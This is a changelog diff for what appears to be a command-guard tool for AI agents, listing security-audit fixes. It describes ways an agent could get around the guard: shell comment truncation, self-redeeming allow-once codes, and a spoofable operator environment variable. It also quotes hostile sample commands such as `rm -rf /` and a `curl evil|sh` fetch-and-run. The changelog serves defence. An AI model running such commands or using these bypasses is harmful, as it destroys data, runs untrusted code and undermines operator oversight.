@@ -1,5 +1,17 @@
 # Changelog
 
+## [Unreleased]
+
+### Security (P0 audit 2026-08-12)
+
+* **Shell comment truncation bypass (P0-1):** `#` is now treated as a comment only when it starts a word (POSIX), so `echo safe#; rm -rf /` no longer truncates evaluation to `echo safe`, and command substitutions glued after `#` (`echo x#$(curl evil|sh)`) are still extracted and evaluated. Segmentation also always evaluates the full original line when it yields a single candidate.
+* **Allow-once self-service bypass (P0-2):** `pending_exceptions.jsonl` now stores only a keyed SHA-256 hash of the redeem code (schema v2); the plaintext code is memory-only and shown solely on the operator's controlling terminal, never in agent-visible output or on disk. Legacy plaintext (v1) rows fail closed on read. The pending/allow-once directory is hardened to `0700` (files remain `0600`). `ryk allow-once *` was removed from the default and strict-preset permit lists so an agent cannot invoke redeem as an allowed command.
+* **`RYK_OPERATOR` removed as an auth signal (P0-3):** operator-only paths (allow-once redeem, allowlist mutations, baseline pack disable) now require an interactive controlling TTY and fail closed otherwise. The `RYK_OPERATOR` environment variable is gone — it authenticated nobody, since a child process can set it on itself.
+* **Audit write-path redaction hardened (P0-4):** the bounded, alloc-free redactor used by the hash-chain and summary writers now runs the structured sensitive-key scan (and URL userinfo detection), matching `redactAlloc`. Structured secrets such as `{"password":"…"}`, `Authorization: Bearer …`, and `mysql://user:pw@host` are now redacted in `events.jsonl`, `summary.json`, `summary.md`, and `ryk replay` output. Redaction is idempotent over existing `[REDACTED…]` markers.
+* **Audit hash chain fork under interleaved writers (P0-5):** the session writer re-syncs the chain tip from disk before an append when the events file grew underneath it (a shim appended), and writes positionally at the true end of file instead of the process-global seek offset. Interleaved parent/shim/parent appends now verify clean under `ryk replay`, while any mid-chain edit still fails verification.
+
+**User-visible behavior changes:** `RYK_OPERATOR` no longer authorizes anything (use an interactive terminal); `ryk allow-once *` is no longer auto-allowed by the default policy; the allow-once redeem code is shown only on the operator terminal.
+
 ## [1.2.17] - 2026-08-12
 
 ## What's Changed
